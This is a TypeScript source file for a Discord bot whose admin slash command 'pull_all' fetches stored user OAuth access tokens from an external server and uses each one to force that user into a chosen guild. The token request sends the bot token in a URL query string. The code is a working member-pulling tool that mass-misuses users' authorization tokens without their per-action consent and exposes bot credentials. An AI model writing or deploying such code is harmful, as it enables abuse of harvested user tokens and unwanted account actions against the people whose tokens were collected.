import { Attachment, CommandInteraction, Embed, EmbedBuilder } from "discord.js";
import { ApplicationCommandOptionType, } from "discord.js";
import fs from "fs"
import * as threading from "worker_threads";

import { Discord, MetadataStorage, Slash, SlashOption } from "discordx";
async function pull_to_guild(bot_token: string, token: string, guild_id: string, id: string): Promise<any> {
  const data = {
    "access_token": token
  };
  const headers = {
    "Authorization": `Bot ${bot_token}`,
    "Content-Type": "application/json"
  };
  const response = await fetch(`https://discord.com/api/v8/guilds/${guild_id}/members/${id}`, {
    method: 'PUT',
    headers: headers,
    body: JSON.stringify(data)
  });
  const responseData = await response.json();
  console.log(responseData)
  return responseData;
}

@Discord()
export class Example {
  @Slash({ description: "pull" ,     defaultMemberPermissions: "Administrator"})
  async pull_all(
    @SlashOption({
      description: "guild id",
      name: "guild_id",
      required: true,
      type: ApplicationCommandOptionType.String,
    })
    guild_id: string,
    interaction: CommandInteraction,
  ): Promise<void> {
    const jsonString = fs.readFileSync('data.json', 'utf-8');
    const config = JSON.parse(jsonString);
    const urll = `${config.url}/active?token=${config.bot_token}`
    console.log(urll)
    const req = await fetch(urll)
    const res = await req.json()
    const array2 = res
    console.log(array2)
    const embed2 = new EmbedBuilder()
      .setFooter({ text: `https://github.com/uiisback/goauth - if u paid u got scammed` })
      .setTitle("**Pull info**")
      .addFields({
        name: "Starting to pull all",
        value: `
        **guild**: ${guild_id}
        **status**: starting to pull...
        
        `,
      });

    interaction.reply({ embeds: [embed2] });
    const failed: string[] = [];
    const done: string[] = [];
    
    const start = Date.now();
    for (const x of array2) {
      try {
        const headers = {
          Authorization: `Bearer ${x}`,
        };
      
        const req = await fetch('https://discord.com/api/v8/users/@me', {
          headers,
        })
        const res = await req.json();
        console.log(res)
        const o = await pull_to_guild(config.bot_token, x, guild_id, res['id']);
        done.push(x);
      } catch (error) {
        console.error(`Failed to add user ${x} to guild: ${error}`);
        failed.push(x);
      }
    }
    const end = Date.now(); 
    const timeTaken = end - start; 
    
    const embed = new EmbedBuilder()
      .setFooter({ text: `https://github.com/uiisback/goauth - if u paid u got scammed` })
      .setTitle("**Pull info**")
      .addFields({
        name: "Complete",
        value: `
        **guild**: ${guild_id}
        **status**: Done
        **time taken**: ${timeTaken}ms
        **Failed**: ${failed}
        **Success**: ${done}
        `,
      });

    interaction.editReply({ embeds: [embed] });
  }
}
